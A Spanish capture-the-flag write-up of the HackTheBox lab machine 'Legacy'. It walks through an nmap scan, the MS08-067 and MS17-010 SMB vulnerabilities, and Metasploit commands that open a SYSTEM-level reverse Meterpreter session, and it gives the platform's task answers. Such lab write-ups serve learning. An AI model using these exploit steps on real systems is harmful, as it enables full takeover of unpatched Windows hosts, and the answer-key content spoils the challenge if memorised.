----

----
![[35b20e936aa2a3cfe70d8e72f1ef47d9.png]]

### 🧪 Task 1 – ¿Cuántos puertos TCP están abiertos en Legacy?

📸 **Escaneo Nmap**

```bash
sudo nmap -sS -sV -Pn -p- 10.10.10.4
```

📍 Resultado:

![[8c28a48cd79210ff3851ac447b49f8e5.png]]

✅ **Respuesta:** `3`

> Solo están abiertos los puertos 135, 139 y 445, todos relacionados con servicios SMB/RPC.


### 📛 Task 2 – ¿Cuál es el CVE del 2008 que permite ejecución remota en SMB?

🔍 Búsqueda rápida en Google + análisis:

> El CVE más conocido de 2008 para SMB con ejecución remota es **CVE-2008-4250** (vulnerabilidad **MS08-067**).

✅ **Respuesta:** `CVE-2008-4250`

🧠 **Nota técnica:**  
Este fallo permitía ejecución remota al enviar paquetes SMB maliciosos a sistemas Windows XP, 2000 o 2003. Fue uno de los más críticos en su época.

![[04c7caebe912df9878787d47c73fbe46.png]]

### 🧨 Task 3 – ¿Cuál es el módulo de Metasploit que explota CVE-2008-4250?

🧰 En Metasploit:

![[81a865f2e7adcf99d807c099c81c30f4.png]]

📌 Resultado:

![[b5588754efa4684b53518dbcb8212cb1.png]]

✅ **Respuesta:** `ms08_067_netapi`

📝 Descripción:

> Este módulo explota un desbordamiento de búfer en el servicio `netapi32.dll`, permitiendo ejecutar código arbitrario con privilegios de SYSTEM.


🧰 Preparación del módulo en Metasploit

```bash
use exploit/windows/smb/ms08_067_netapi
show options
```

![[c4927bc72bc7f782f07acc7c80c3fbe9.png]]

📍 Configuración:

```bash
set RHOSTS 10.10.10.4
set LHOST 10.10.14.6  # Tu IP tun0
set LPORT 4444
```

💥 Ejecución:

![[d23dcf7f646b94c918dbeb7b1da67b0c.png]]

### 🧑‍💻 Task 4 – ¿Con qué usuario se ejecuta el exploit MS08-067?

🧠 Tras ejecutar el exploit en Metasploit y abrir la sesión Meterpreter, utilizamos el comando:

```bash
getuid
```

📍 Salida:

![[f51b8ac5bfc97b9e65154f7ef59e77b6.png]]

✅ **Respuesta:** `NT AUTHORITY\SYSTEM`

📌 **Significado:**  
El exploit se ejecuta con privilegios **SYSTEM**, el nivel más alto en un sistema Windows (superior incluso al de "Administrator").

🔒 Esto confirma que **no es necesaria escalada de privilegios** en esta máquina, ya que conseguimos directamente control total sobre el sistema.

### 🏁 Task 5 – Localización y captura de flags

#### 🧾 `user.txt`

📁 Ruta:

![[d2f7111b2fc06d8f44612d3b1473e8ba.png]]

#### 🧾 `root.txt`

📁 Ruta:

![[ada37165d53bbe9ef55160f4cc7cf894.png]]

### 🧠 Task 7 – Otra vulnerabilidad RCE en SMB (CVE 2017)

📌 La pregunta completa es:

> Además de MS08-067, el servicio SMB de Legacy también es vulnerable a otra vulnerabilidad de ejecución remota con un CVE de 2017. ¿Cuál es ese ID?

🔗 Exploit-DB:

1. Vamos a [https://www.exploit-db.com](https://www.exploit-db.com)
    
2. En el buscador, pon:

![[14d8e5507e5cd65bc2751973dff7870d.png]]

### 🔍 ¿Por qué `CVE-2017-0143`?

Aunque **CVE-2017-0144** (EternalBlue) es la más famosa, **HTB en esta máquina espera específicamente la primera del paquete MS17-010**, que es:

- **CVE-2017-0143**: Identificada como parte del exploit "EternalSynergy" / "EternalRomance"
    
- Relacionada con ejecución remota en SMBv1
    
- Compatible con sistemas antiguos como Windows XP y 2003 (como en esta máquina)
    

📦 Pertenece al boletín **MS17-010** junto con:

- `CVE-2017-0144` (EternalBlue)
    
- `CVE-2017-0145`, `0146`, `0147`, `0148`...
    

Pero **la más "compatible" con máquinas como Legacy (Windows XP)** es `0143`.

------
### ✅ Conclusión Final

📌 La máquina **Legacy** es un excelente ejemplo para comprender:

- Cómo identificar servicios antiguos (SMB en puertos 139 y 445).
    
- La explotación de **MS08-067** con **Metasploit**, sin necesidad de escalada de privilegios.
    
- La obtención directa de acceso `SYSTEM` y captura de flags.
    

🛠️ **Técnicas empleadas:**

- `nmap` para descubrimiento de puertos.
    
- `msfconsole` con el módulo `ms08_067_netapi`.
    
- Comandos internos de Windows (`cd`, `dir`, `type`) para localizar y visualizar las flags.